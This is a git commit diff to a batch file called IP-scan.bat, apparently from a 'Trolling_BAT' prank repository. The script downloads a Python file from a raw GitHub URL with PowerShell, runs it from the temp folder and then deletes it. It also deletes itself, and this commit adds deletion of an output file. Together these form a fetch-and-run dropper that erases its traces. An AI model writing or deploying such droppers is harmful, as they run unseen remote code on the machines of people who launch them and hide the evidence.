4ed9c4cd3e16221144ccdcd581631601a18f1d35
MangoTheSherlock <manuel.saemann1@outlook.de>
2025-03-24 23:27:57 +0100

    Update IP-scan.bat

--- IP-scan.bat
+++ IP-scan.bat
@@ -3,6 +3,7 @@ setlocal
 
 set "URL=https://raw.githubusercontent.com/MangoTheSherlock/Trolling_BAT/main/IP-scan.py"
 set "ZIELDATEI=%TEMP%\IP-scan.py"
+set "OUTPUTDATEI=%TEMP%\output.txt"
 
 powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%URL%', '%ZIELDATEI%')"
 
@@ -11,6 +12,7 @@ python "%ZIELDATEI%"
 timeout /t 2 >nul
 
 del "%ZIELDATEI%"
+del "%OUTPUTDATEI%"
 del "%~f0"
 
 endlocal
